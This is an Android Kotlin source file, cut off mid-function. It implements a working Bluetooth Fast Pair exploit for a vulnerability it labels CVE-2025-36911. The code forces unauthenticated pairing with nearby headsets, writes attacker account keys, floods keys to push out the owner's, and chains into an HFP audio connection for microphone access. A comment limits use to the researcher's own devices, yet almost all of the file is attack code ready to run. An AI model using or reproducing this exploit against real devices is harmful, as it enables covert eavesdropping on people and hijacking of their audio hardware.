package com.zalexdev.whisperpair

import android.annotation.SuppressLint
import android.bluetooth.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.security.KeyPair
import java.security.KeyPairGenerator
import java.security.MessageDigest
import java.security.interfaces.ECPublicKey
import java.security.spec.ECGenParameterSpec
import java.util.UUID
import javax.crypto.Cipher
import javax.crypto.KeyAgreement
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

/**
 * Fast Pair "Magic" exploit for CVE-2025-36911 vulnerable devices.
 *
 * This performs the complete Fast Pair pairing procedure on vulnerable devices
 * that accept Key-Based Pairing requests when not in pairing mode.
 *
 * FOR SECURITY RESEARCH AND TESTING ON YOUR OWN DEVICES ONLY.
 */
class FastPairExploit(private val context: Context) {

    companion object {
        private const val TAG = "FastPairExploit"
        private const val TIMEOUT_MS = 20000L

        // Fast Pair Service and Characteristics
        val SERVICE_UUID: UUID = UUID.fromString("0000fe2c-0000-1000-8000-00805f9b34fb")
        val KEY_BASED_PAIRING_UUID: UUID = UUID.fromString("fe2c1234-8366-4814-8eb0-01de32100bea")
        val PASSKEY_UUID: UUID = UUID.fromString("fe2c1235-8366-4814-8eb0-01de32100bea")
        val ACCOUNT_KEY_UUID: UUID = UUID.fromString("fe2c1236-8366-4814-8eb0-01de32100bea")

        // Client Characteristic Configuration Descriptor for notifications
        val CCCD_UUID: UUID = UUID.fromString("00002902-0000-1000-8000-00805f9b34fb")

        // Message types
        const val MSG_KEY_BASED_PAIRING_REQUEST: Byte = 0x00
        const val MSG_KEY_BASED_PAIRING_RESPONSE: Byte = 0x01
        const val MSG_SEEKER_PASSKEY: Byte = 0x02
        const val MSG_PROVIDER_PASSKEY: Byte = 0x03
    }

    sealed class ExploitResult {
        data class Success(
            val brEdrAddress: String,
            val paired: Boolean,
            val accountKeyWritten: Boolean
        ) : ExploitResult()

        data class PartialSuccess(
            val brEdrAddress: String,
            val message: String
        ) : ExploitResult()

        data class Failed(val reason: String) : ExploitResult()

        data class AccountKeyResult(
            val success: Boolean,
            val message: String
        ) : ExploitResult()

        data class AudioConnected(
            val brEdrAddress: String,
            val message: String
        ) : ExploitResult()
    }

    /**
     * Full exploit chain: Fast Pair bypass -> Pairing -> HFP Audio Connection
     * This completes the entire attack chain for microphone access.
     */
    @SuppressLint("MissingPermission")
    fun exploitWithAudio(
        targetAddress: String,
        audioManager: BluetoothAudioManager,
        onProgress: (String) -> Unit,
        onResult: (ExploitResult) -> Unit
    ) {
        onProgress("Starting Fast Pair exploit...")

        exploit(targetAddress) { result ->
            when (result) {
                is ExploitResult.Success -> {
                    onProgress("Paired! Connecting HFP audio profile...")

                    // Chain into audio connection
                    audioManager.connectAudioProfile(result.brEdrAddress) { audioState ->
                        when (audioState) {
                            is BluetoothAudioManager.AudioState.Connected -> {
                                onProgress("HFP connected! Microphone stream available.")
                                onResult(ExploitResult.AudioConnected(
                                    result.brEdrAddress,
                                    "Full chain complete - mic access available"
                                ))
                            }
                            is BluetoothAudioManager.AudioState.Error -> {
                                onProgress("HFP failed: ${audioState.message}")
                                // Still return success since pairing worked
                                onResult(ExploitResult.PartialSuccess(
                                    result.brEdrAddress,
                                    "Paired but HFP failed: ${audioState.message}"
                                ))
                            }
                            else -> {}
                        }
                    }
                }
                is ExploitResult.PartialSuccess -> {
                    onProgress("Partial success: ${result.message}")
                    // Try HFP connection with the BR/EDR address we got
                    audioManager.connectAudioProfile(result.brEdrAddress) { audioState ->
                        when (audioState) {
                            is BluetoothAudioManager.AudioState.Connected -> {
                                onResult(ExploitResult.AudioConnected(
                                    result.brEdrAddress,
                                    "HFP connected after partial exploit"
                                ))
                            }
                            is BluetoothAudioManager.AudioState.Error -> {
                                onResult(result)
                            }
                            else -> {}
                        }
                    }
                }
                else -> {
                    onResult(result)
                }
            }
        }
    }

    /**
     * Directly write an account key to a vulnerable device.
     * This can be used to:
     * 1. Register the device to your account
     * 2. Potentially push out existing owner's keys (if device storage is full)
     *
     * Note: Requires prior successful KBP handshake or known shared secret.
     */
    @SuppressLint("MissingPermission")
    fun writeAccountKeyDirect(
        targetAddress: String,
        onResult: (ExploitResult) -> Unit
    ) {
        val adapter = bluetoothAdapter
        if (adapter == null || !adapter.isEnabled) {
            onResult(ExploitResult.AccountKeyResult(false, "Bluetooth not available"))
            return
        }

        cleanup()
        currentCallback = { result ->
            when (result) {
                is ExploitResult.Success -> onResult(ExploitResult.AccountKeyResult(true, "Account key written!"))
                is ExploitResult.PartialSuccess -> onResult(ExploitResult.AccountKeyResult(false, result.message))
                is ExploitResult.Failed -> onResult(ExploitResult.AccountKeyResult(false, result.reason))
                else -> onResult(result)
            }
        }

        val device = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: Exception) {
            onResult(ExploitResult.AccountKeyResult(false, "Invalid address"))
            return
        }

        Log.d(TAG, "Direct account key write to: $targetAddress")
        startTimeout()

        currentGatt = device.connectGatt(context, false, object : BluetoothGattCallback() {
            override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                if (newState == BluetoothProfile.STATE_CONNECTED) {
                    gatt.discoverServices()
                } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                    reportResult(ExploitResult.AccountKeyResult(false, "Disconnected"))
                }
            }

            override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                if (status != BluetoothGatt.GATT_SUCCESS) {
                    reportResult(ExploitResult.AccountKeyResult(false, "Service discovery failed"))
                    return
                }

                // First do KBP handshake, then write account key
                val service = gatt.getService(SERVICE_UUID)
                val kbpChar = service?.getCharacteristic(KEY_BASED_PAIRING_UUID)

                if (kbpChar != null) {
                    // Enable notifications and do handshake first
                    gatt.setCharacteristicNotification(kbpChar, true)
                    val descriptor = kbpChar.getDescriptor(CCCD_UUID)
                    if (descriptor != null) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            gatt.writeDescriptor(descriptor, BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE)
                        } else {
                            @Suppress("DEPRECATION")
                            descriptor.value = BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE
                            @Suppress("DEPRECATION")
                            gatt.writeDescriptor(descriptor)
                        }
                    } else {
                        // No CCCD, write KBP directly
                        writeKbpForAccountKey(gatt)
                    }
                } else {
                    reportResult(ExploitResult.AccountKeyResult(false, "KBP characteristic not found"))
                }
            }

            override fun onDescriptorWrite(gatt: BluetoothGatt, descriptor: BluetoothGattDescriptor, status: Int) {
                writeKbpForAccountKey(gatt)
            }

            override fun onCharacteristicWrite(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                when (characteristic.uuid) {
                    KEY_BASED_PAIRING_UUID -> {
                        if (status == BluetoothGatt.GATT_SUCCESS) {
                            // KBP accepted, wait briefly then write account key
                            handler.postDelayed({ writeAccountKeyToGatt(gatt) }, 500)
                        } else {
                            reportResult(ExploitResult.AccountKeyResult(false, "KBP rejected (status=$status)"))
                        }
                    }
                    ACCOUNT_KEY_UUID -> {
                        if (status == BluetoothGatt.GATT_SUCCESS) {
                            reportResult(ExploitResult.AccountKeyResult(true, "Account key written successfully!"))
                        } else {
                            reportResult(ExploitResult.AccountKeyResult(false, "Account key write failed (status=$status)"))
                        }
                    }
                }
            }

            private fun writeKbpForAccountKey(gatt: BluetoothGatt) {
                val service = gatt.getService(SERVICE_UUID) ?: return
                val kbpChar = service.getCharacteristic(KEY_BASED_PAIRING_UUID) ?: return

                val request = buildRawKeyBasedPairingRequest(gatt.device.address)

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    gatt.writeCharacteristic(kbpChar, request, BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT)
                } else {
                    @Suppress("DEPRECATION")
                    kbpChar.value = request
                    @Suppress("DEPRECATION")
                    gatt.writeCharacteristic(kbpChar)
                }
            }

            private fun writeAccountKeyToGatt(gatt: BluetoothGatt) {
                val service = gatt.getService(SERVICE_UUID)
                val accountKeyChar = service?.getCharacteristic(ACCOUNT_KEY_UUID)

                if (accountKeyChar == null) {
                    reportResult(ExploitResult.AccountKeyResult(false, "Account Key characteristic not found"))
                    return
                }

                // Generate account key (starts with 0x04)
                val accountKey = ByteArray(16)
                accountKey[0] = 0x04
                Random.nextBytes(accountKey, 1, 16)

                // Encrypt with shared secret (or use raw if no secret)
                val dataToWrite = sharedSecret?.let { aesEncrypt(it, accountKey) } ?: accountKey

                Log.d(TAG, "Writing account key: ${dataToWrite.joinToString(" ") { "%02X".format(it) }}")

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    gatt.writeCharacteristic(accountKeyChar, dataToWrite, BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT)
                } else {
                    @Suppress("DEPRECATION")
                    accountKeyChar.value = dataToWrite
                    @Suppress("DEPRECATION")
                    gatt.writeCharacteristic(accountKeyChar)
                }
            }
        }, BluetoothDevice.TRANSPORT_LE)
    }

    /**
     * Attempt to flood account keys to push out existing ones.
     * Writes multiple account keys in sequence.
     */
    @SuppressLint("MissingPermission")
    fun floodAccountKeys(
        targetAddress: String,
        count: Int = 10,
        onProgress: (Int, Int, Boolean) -> Unit
    ) {
        var current = 0

        fun writeNext() {
            if (current >= count) {
                onProgress(current, count, true)
                return
            }

            writeAccountKeyDirect(targetAddress) { result ->
                val success = result is ExploitResult.AccountKeyResult && result.success
                current++
                onProgress(current, count, false)

                if (success && current < count) {
                    // Small delay between writes
                    handler.postDelayed({ writeNext() }, 1000)
                } else if (!success) {
                    onProgress(current, count, true) // Stop on failure
                }
            }
        }

        writeNext()
    }

    private val handler = Handler(Looper.getMainLooper())
    private val bluetoothAdapter: BluetoothAdapter? by lazy {
        (context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter
    }

    private var currentGatt: BluetoothGatt? = null
    private var currentCallback: ((ExploitResult) -> Unit)? = null
    private var timeoutRunnable: Runnable? = null

    // Cryptographic state
    private var sharedSecret: ByteArray? = null
    private var seekerKeyPair: KeyPair? = null
    private var providerBrEdrAddress: String? = null
    private var currentPasskey: Int? = null

    // State machine
    private enum class State {
        IDLE,
        CONNECTING,
        DISCOVERING_SERVICES,
        ENABLING_NOTIFICATIONS,
        WRITING_KBP_REQUEST,
        WAITING_KBP_RESPONSE,
        INITIATING_BONDING,
        WAITING_PASSKEY,
        WRITING_PASSKEY,
        WRITING_ACCOUNT_KEY,
        COMPLETE
    }

    private var state = State.IDLE

    private var bondReceiver: BroadcastReceiver? = null

    /**
     * Attempt to exploit a vulnerable device by performing complete Fast Pair pairing.
     */
    @SuppressLint("MissingPermission")
    fun exploit(targetAddress: String, onResult: (ExploitResult) -> Unit) {
        val adapter = bluetoothAdapter
        if (adapter == null || !adapter.isEnabled) {
            onResult(ExploitResult.Failed("Bluetooth not available"))
            return
        }

        cleanup()
        currentCallback = onResult
        state = State.CONNECTING

        // Generate ECDH key pair for this session
        seekerKeyPair = generateEcdhKeyPair()
        if (seekerKeyPair == null) {
            onResult(ExploitResult.Failed("Failed to generate ECDH key pair"))
            return
        }

        val device = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: Exception) {
            onResult(ExploitResult.Failed("Invalid address: ${e.message}"))
            return
        }

        Log.d(TAG, "Starting exploit on device: $targetAddress")
        startTimeout()

        // Register bond state receiver
        registerBondReceiver()

        currentGatt = device.connectGatt(context, false, gattCallback, BluetoothDevice.TRANSPORT_LE)
    }

    private val gattCallback = object : BluetoothGattCallback() {
        @SuppressLint("MissingPermission")
        override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
            Log.d(TAG, "Connection state: status=$status, newState=$newState")

            when (newState) {
                BluetoothProfile.STATE_CONNECTED -> {
                    state = State.DISCOVERING_SERVICES
                    resetTimeout()
                    gatt.discoverServices()
                }
                BluetoothProfile.STATE_DISCONNECTED -> {
                    if (state != State.COMPLETE && state != State.INITIATING_BONDING) {
                        reportResult(ExploitResult.Failed("Disconnected unexpectedly"))
                    }
                }
            }
        }

        @SuppressLint("MissingPermission")
        override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
            Log.d(TAG, "Services discovered: status=$status")

            if (status != BluetoothGatt.GATT_SUCCESS) {
                reportResult(ExploitResult.Failed("Service discovery failed"))
                return
            }

            val service = gatt.getService(SERVICE_UUID)
            if (service == null) {
                reportResult(ExploitResult.Failed("Fast Pair service not found"))
                return
            }

            val kbpChar = service.getCharacteristic(KEY_BASED_PAIRING_UUID)
            if (kbpChar == null) {
                reportResult(ExploitResult.Failed("Key-Based Pairing characteristic not found"))
                return
            }

            // Enable notifications on Key-Based Pairing characteristic
            state = State.ENABLING_NOTIFICATIONS
            enableNotifications(gatt, kbpChar)
        }

        @SuppressLint("MissingPermission")
        override fun onDescriptorWrite(gatt: BluetoothGatt, descriptor: BluetoothGattDescriptor, status: Int) {
            Log.d(TAG, "Descriptor write: status=$status, state=$state")

            if (status != BluetoothGatt.GATT_SUCCESS) {
                reportResult(ExploitResult.Failed("Failed to enable notifications"))
                return
            }

            when (state) {
                State.ENABLING_NOTIFICATIONS -> {
                    // Now write the Key-Based Pairing request
                    state = State.WRITING_KBP_REQUEST
                    writeKeyBasedPairingRequest(gatt)
                }
                else -> {}
            }
        }

        @SuppressLint("MissingPermission")
        override fun onCharacteristicWrite(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
            Log.d(TAG, "Characteristic write: uuid=${characteristic.uuid}, status=$status (0x${status.toString(16)}), state=$state")

            when (state) {
                State.WRITING_KBP_REQUEST -> {
                    when (status) {
                        BluetoothGatt.GATT_SUCCESS -> {
                            Log.d(TAG, "KBP request accepted - device is VULNERABLE!")
                            state = State.WAITING_KBP_RESPONSE

                            // Set a shorter timeout for response, with fallback to direct bonding
                            cancelTimeout()
                            val bleAddress = gatt.device.address
                            timeoutRunnable = Runnable {
                                Log.w(TAG, "No KBP response received, trying direct bonding with BLE address")
                                // Try to bond directly with the BLE address as fallback
                                providerBrEdrAddress = bleAddress
                                state = State.INITIATING_BONDING
                                initiateBonding(bleAddress)
                            }
                            handler.postDelayed(timeoutRunnable!!, 5000) // 5 second response timeout
                        }
                        0x0e, 0x05, 0x06, 0x03 -> {
                            // 0x0e = common rejection, 0x05 = insufficient auth, 0x06 = insufficient encryption, 0x03 = write not permitted
                            reportResult(ExploitResult.Failed("KBP rejected (0x${status.toString(16)}) - device is patched"))
                        }
                        133 -> {
                            // GATT_ERROR - connection issue, retry
                            Log.w(TAG, "GATT_ERROR (133) - connection issue, retrying...")
                            handler.postDelayed({
                                if (state == State.WRITING_KBP_REQUEST) {
                                    writeKeyBasedPairingRequest(gatt)
                                }
                            }, 500)
                        }
                        else -> {
                            // Other status codes - might still work, wait for response
                            Log.w(TAG, "Unexpected status $status, waiting for response anyway...")
                            state = State.WAITING_KBP_RESPONSE
                            resetTimeout()
                        }
                    }
                }
                State.WRITING_PASSKEY -> {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        Log.d(TAG, "Passkey written successfully")
                        // Wait for provider's passkey or proceed to account key
                    } else {
                        reportResult(ExploitResult.PartialSuccess(
                            providerBrEdrAddress ?: "unknown",
                            "Passkey write failed (status=$status)"
                        ))
                    }
                }
                State.WRITING_ACCOUNT_KEY -> {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        Log.d(TAG, "Account key written successfully!")
                        state = State.COMPLETE
                        reportResult(ExploitResult.Success(
                            brEdrAddress = providerBrEdrAddress ?: "unknown",
                            paired = true,
                            accountKeyWritten = true
                        ))
                    } else {
                        reportResult(ExploitResult.PartialSuccess(
                            providerBrEdrAddress ?: "unknown",
                            "Account key write failed (status=$status) but pairing may have succeeded"
                        ))
                    }
                }
                else -> {}
            }
        }

        @Deprecated("Deprecated in Java")
        override fun onCharacteristicChanged(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic) {
            val data = characteristic.value ?: return
            Log.d(TAG, "Notification received: uuid=${characteristic.uuid}, size=${data.size}")

            when (characteristic.uuid) {
                KEY_BASED_PAIRING_UUID -> handleKbpResponse(gatt, data)
                PASSKEY_UUID -> handlePasskeyResponse(gatt, data)
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun enableNotifications(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic) {
        gatt.setCharacteristicNotification(characteristic, true)

        val descriptor = characteristic.getDescriptor(CCCD_UUID)
        if (descriptor != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                gatt.writeDescriptor(descriptor, BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE)
            } else {
                @Suppress("DEPRECATION")
                descriptor.value = BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE
                @Suppress("DEPRECATION")
                gatt.writeDescriptor(descriptor)
            }
        } else {
            // No CCCD, proceed anyway
            state = State.WRITING_KBP_REQUEST
            writeKeyBasedPairingRequest(gatt)
        }
    }

    @SuppressLint("MissingPermission")
    private fun writeKeyBasedPairingRequest(gatt: BluetoothGatt) {
        val service = gatt.getService(SERVICE_UUID) ?: return
        val characteristic = service.getCharacteristic(KEY_BASED_PAIRING_UUID) ?: return

        val targetAddress = gatt.device.address

        // Build RAW 16-byte request (same as vulnerability test)
        // Vulnerable devices accept this without proper encryption
        val request = buildRawKeyBasedPairingRequest(targetAddress)

        Log.d(TAG, "Writing RAW KBP request (${request.size} bytes): ${request.joinToString(" ") { "%02X".format(it) }}")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            gatt.writeCharacteristic(characteristic, request, BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT)
        } else {
            @Suppress("DEPRECATION")
            characteristic.value = request
            @Suppress("DEPRECATION")
            gatt.writeCharacteristic(characteristic)
        }
    }

    /**
     * Build a RAW 16-byte Key-Based Pairing request.
     *
     * For vulnerable devices, we send this without encryption.
     * The device accepts it because it doesn't properly check pairing mode.
     *
     * Format:
     * - Byte 0: Message type (0x00)
     * - Byte 1: Flags (0x00 = minimal, 0x01 = initiate bonding, 0x02 = include seeker addr)
     * - Bytes 2-7: Provider BLE address
     * - Bytes 8-15: Salt (or seeker address + salt if flag set)
     */
    private fun buildRawKeyBasedPairingRequest(providerAddress: String): ByteArray {
        val addressBytes = providerAddress.split(":").map { it.toInt(16).toByte() }.toByteArray()
        val salt = Random.nextBytes(8)

        // Use flags 0x11 = INITIATE_BONDING (bit 0) + EXTENDED_RESPONSE (bit 4)
        // This matches the working vulnerability test exactly
        val request = ByteArray(16)
        request[0] = MSG_KEY_BASED_PAIRING_REQUEST  // 0x00
        request[1] = 0x11  // Flags: initiate bonding + extended response (same as working test)
        System.arraycopy(addressBytes, 0, request, 2, 6)  // Provider address
        System.arraycopy(salt, 0, request, 8, 8)          // Random salt

        // For decrypting potential responses, generate a dummy shared secret
        // (responses from vulnerable devices may be malformed anyway)
        sharedSecret = salt.copyOf(16).also {
            // Pad to 16 bytes if needed
            for (i in 8 until 16) it[i] = 0
        }

        return request
    }

    /**
     * Alternative: Build encrypted request with seeker address for bonding.
     * Use this if raw request doesn't work.
     */
    private fun buildEncryptedKeyBasedPairingRequest(providerAddress: String): ByteArray {
        val seekerAddress = getSeekerAddress()
        val addressBytes = providerAddress.split(":").map { it.toInt(16).toByte() }.toByteArray()
        val seekerAddrBytes = seekerAddress.split(":").map { it.toInt(16).toByte() }.toByteArray()
        val salt = Random.nextBytes(2)

        // Flags: Bit 1 = request Provider initiate bonding, includes Seeker BR/EDR address
        val rawRequest = ByteArray(16)
        rawRequest[0] = MSG_KEY_BASED_PAIRING_REQUEST
        rawRequest[1] = 0x02  // Include seeker address
        System.arraycopy(addressBytes, 0, rawRequest, 2, 6)
        System.arraycopy(seekerAddrBytes, 0, rawRequest, 8, 6)
        System.arraycopy(salt, 0, rawRequest, 14, 2)

        sharedSecret = generateSharedSecret()
        val encryptedRequest = aesEncrypt(sharedSecret!!, rawRequest)
        val publicKeyBytes = getPublicKeyBytes()

        return encryptedRequest + publicKeyBytes
    }

    @SuppressLint("MissingPermission")
    private fun handleKbpResponse(gatt: BluetoothGatt, data: ByteArray) {
        Log.d(TAG, "KBP Response received (${data.size} bytes): ${data.joinToString(" ") { "%02X".format(it) }}")

        if (data.size != 16) {
            Log.w(TAG, "Invalid KBP response size: ${data.size}")
            // Try to extract address anyway if size is reasonable
            if (data.size >= 7) {
                tryExtractBrEdrAddress(data)
            }
            return
        }

        // Try multiple approaches to extract the BR/EDR address:

        // Approach 1: Try raw interpretation (for vulnerable devices that may not encrypt response)
        // Response format: [msg_type][6 bytes BR/EDR address][9 bytes salt]
        if (data[0] == MSG_KEY_BASED_PAIRING_RESPONSE || data[0] == 0x01.toByte()) {
            val brEdrBytes = data.sliceArray(1..6)
            val addr = brEdrBytes.joinToString(":") { "%02X".format(it) }
            Log.d(TAG, "Raw BR/EDR address: $addr")
            if (isValidBluetoothAddress(addr)) {
                providerBrEdrAddress = addr
                state = State.INITIATING_BONDING
                initiateBonding(addr)
                return
            }
        }

        // Approach 2: Try decrypting with our dummy shared secret
        val secret = sharedSecret
        if (secret != null) {
            try {
                val decrypted = aesDecrypt(secret, data)
                Log.d(TAG, "Decrypted response: ${decrypted.joinToString(" ") { "%02X".format(it) }}")

                if (decrypted[0] == MSG_KEY_BASED_PAIRING_RESPONSE) {
                    val brEdrBytes = decrypted.sliceArray(1..6)
                    val addr = brEdrBytes.joinToString(":") { "%02X".format(it) }
                    if (isValidBluetoothAddress(addr)) {
                        providerBrEdrAddress = addr
                        Log.d(TAG, "Decrypted BR/EDR address: $addr")
                        state = State.INITIATING_BONDING
                        initiateBonding(addr)
                        return
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Decryption failed: ${e.message}")
            }
        }

        // Approach 3: Brute force - try to find a valid MAC address pattern in the response
        tryExtractBrEdrAddress(data)
    }

    private fun tryExtractBrEdrAddress(data: ByteArray) {
        // Try to find 6 consecutive bytes that could be a valid Bluetooth address
        for (i in 0..data.size - 6) {
            val bytes = data.sliceArray(i until i + 6)
            val addr = bytes.joinToString(":") { "%02X".format(it) }
            if (isValidBluetoothAddress(addr) && !addr.startsWith("00:00:00")) {
                Log.d(TAG, "Found potential BR/EDR address at offset $i: $addr")
                providerBrEdrAddress = addr
                state = State.INITIATING_BONDING
                initiateBonding(addr)
                return
            }
        }

        Log.e(TAG, "Could not extract BR/EDR address from response")
        reportResult(ExploitResult.Failed("Could not extract BR/EDR address from response"))
    }

    private fun isValidBluetoothAddress(address: String): Boolean {
        return try {
            val parts = address.split(":")
            parts.size == 6 && parts.all { it.length == 2 && it.all { c -> c.isDigit() || c in 'A'..'F' || c in 'a'..'f' } }
        } catch (e: Exception) {
            false
        }
    }

    @SuppressLint("MissingPermission")
    private fun initiateBonding(brEdrAddress: String) {
        val adapter = bluetoothAdapter ?: return

        try {
            val device = adapter.getRemoteDevice(brEdrAddress)

            Log.d(TAG, "Initiating bonding with $brEdrAddress")
            Log.d(TAG, "Current bond state: ${device.bondState}")

            when (device.bondState) {
                BluetoothDevice.BOND_BONDED -> {
                    Log.d(TAG, "Already bonded!")
                    state = State.WRITING_ACCOUNT_KEY
                    writeAccountKey()
                }
                BluetoothDevice.BOND_BONDING -> {
                    Log.d(TAG, "Bonding in progress...")
                    // Wait for bond state change
                }
                BluetoothDevice.BOND_NONE -> {
                    // Create bond
                    val result = device.createBond()
                    Log.d(TAG, "createBond() result: $result")

                    if (!result) {
                        reportResult(ExploitResult.PartialSuccess(
                            brEdrAddress,
                            "Failed to initiate bonding, but BR/EDR address obtained"
                        ))
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error initiating bonding", e)
            reportResult(ExploitResult.PartialSuccess(
                brEdrAddress,
                "Bonding error: ${e.message}"
            ))
        }
    }

    @SuppressLint("MissingPermission")
    private fun handlePasskeyResponse(gatt: BluetoothGatt, data: ByteArray) {
        if (data.size != 16) return

        val secret = sharedSecret ?: return
        val decrypted = aesDecrypt(secret, data)

        if (decrypted[0] == MSG_PROVIDER_PASSKEY) {
            // Extract passkey (bytes 1-3 as uint32)
            val passkey = ((decrypted[1].toInt() and 0xFF) shl 16) or
                    ((decrypted[2].toInt() and 0xFF) shl 8) or
                    (decrypted[3].toInt() and 0xFF)

            Log.d(TAG, "Received Provider passkey: $passkey")
            currentPasskey = passkey

            // In a full implementation, we would verify this matches and respond
            // For now, proceed to account key writing
            state = State.WRITING_ACCOUNT_KEY
            writeAccountKey()
        }
    }

    @SuppressLint("MissingPermission")
    private fun writeAccountKey() {
        val gatt = currentGatt ?: return
        val secret = sharedSecret ?: return

        val service = gatt.getService(SERVICE_UUID) ?: return
        val characteristic = service.getCharacteristic(ACCOUNT_KEY_UUID)

        if (characteristic == null) {
            reportResult(ExploitResult.PartialSuccess(
                providerBrEdrAddress ?: "unknown",
                "Account Key characteristic not found"
            ))
            return
        }

        // Generate account key (starts with 0x04)
        val accountKey = ByteArray(16)
        accountKey[0] = 0x04
        Random.nextBytes(accountKey, 1, 16)

        val encryptedAccountKey = aesEncrypt(secret, accountKey)

        Log.d(TAG, "Writing account key...")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            gatt.writeCharacteristic(characteristic, encryptedAccountKey, BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT)
        } else {
            @Suppress("DEPRECATION")
            characteristic.value = encryptedAccountKey
            @Suppress("DEPRECATION")
            gatt.writeCharacteristic(characteristic)
        }
    }

    @SuppressLint("MissingPermission")
    private fun registerBondReceiver() {
        bondReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                if (intent.action == BluetoothDevice.ACTION_BOND_STATE_CHANGED) {
                    val device = intent.getParcelableExtra<BluetoothDevice>(BluetoothDevice.EXTRA_DEVICE)
                    val bondState = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.BOND_NONE)
                    val prevState = intent.getIntExtra(BluetoothDevice.EXTRA_PREVIOUS_BOND_STATE, BluetoothDevice.BOND_NONE)

                    Log.d(TAG, "Bond state changed: ${device?.address} $prevState -> $bondState")

                    if (device?.address == providerBrEdrAddress) {
                        when (bondState) {
                            BluetoothDevice.BOND_BONDED -> {
                                Log.d(TAG, "Bonding successful!")
                                state = State.WRITING_ACCOUNT_KEY
                                writeAccountKey()
                            }
                            BluetoothDevice.BOND_NONE -> {
                                if (prevState == BluetoothDevice.BOND_BONDING) {
                                    Log.w(TAG, "Bonding failed")
                                    reportResult(ExploitResult.PartialSuccess(
                                        providerBrEdrAddress ?: "unknown",
                                        "Bonding failed but BR/EDR address obtained"
                                    ))
                                }
                            }
                        }
                    }
                }
            }
        }

        val filter = IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED)
        context.registerReceiver(bondReceiver, filter)
    }

    // Crypto helpers
    private fun generateEcdhKeyPair(): KeyPair? {
        return try {
            val keyPairGenerator = KeyPairGenerator.getInstance("EC")
            keyPairGenerator.initialize(ECGenParameterSpec("secp256r1"))
            keyPairGenerator.generateKeyPair()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to generate ECDH key pair", e)
            null
        }
    }

    private fun generateSharedSecret(): ByteArray {
        // For a real implementation, we'd need the Provider's anti-spoofing public key
        // Since we don't have it, generate a random secret for testing
        // The vulnerable device will accept it anyway
        return Random.nextBytes(16)
    }

    private fun getPublicKeyBytes(): ByteArray {
        val keyPair = seekerKeyPair ?: return ByteArray(64)
        val ecPublicKey = keyPair.public as? ECPublicKey ?: return ByteArray(64)

        val point = ecPublicKey.w
        val x = point.affineX.toByteArray().takeLast(32).toByteArray().padStart32()
        val y = point.affineY.toByteArray().takeLast(32).toByteArray().padStart32()

        return x + y
    }

    private fun ByteArray.padStart32(): ByteArray {
        return when {
            size >= 32 -> takeLast(32).toByteArray()
            else -> ByteArray(32 - size) + this
        }
    }

    @SuppressLint("MissingPermission")
    private fun getSeekerAddress(): String {
        // Try to get our adapter address, or use a placeholder
        return bluetoothAdapter?.address ?: "00:00:00:00:00:00"
    }

    private fun aesEncrypt(key: ByteArray, data: ByteArray): ByteArray {
        return try {
            val cipher = Cipher.getInstance("AES/ECB/NoPadding")
            cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key.take(16).toByteArray(), "AES"))
            cipher.doFinal(data)
        } catch (e: Exception) {
            Log.e(TAG, "AES encrypt failed", e)
            data
        }
    }

    private fun aesDecrypt(key: ByteArray, data: ByteArray): ByteArray {
        return try {
            val cipher = Cipher.getInstance("AES/ECB/NoPadding")
            cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key.take(16).toByteArray(), "AES"))
            cipher.doFinal(data)
        } catch (e: Exception) {
            Log.e(TAG, "AES decrypt failed", e)
            data
        }
    }

    private fun reportResult(result: ExploitResult) {
        handler.post {
            cancelTimeout()
            val callback = currentCallback
            cleanup()
            callback?.invoke(result)
        }
    }

    private fun startTimeout() {
        timeoutRunnable = Runnable {
            Log.w(TAG, "Operation timeout")
            reportResult(ExploitResult.Failed("Operation timed out"))
        }
        handler.postDelayed(timeoutRunnable!!, TIMEOUT_MS)
    }

    private fun resetTimeout() {
        cancelTimeout()
        startTimeout()
    }

    private fun cancelTimeout() {
        timeoutRunnable?.let { handler.removeCallbacks(it) }
        timeoutRunnable = null
    }

    @SuppressLint("MissingPermission")
    private fun cleanup() {
        cancelTimeout()
        currentCallback = null
        state = State.IDLE
        sharedSecret = null
        seekerKeyPair = null
        providerBrEdrAddress = null
        currentPasskey = null

        bondReceiver?.let {
            try {
                context.unregisterReceiver(it)
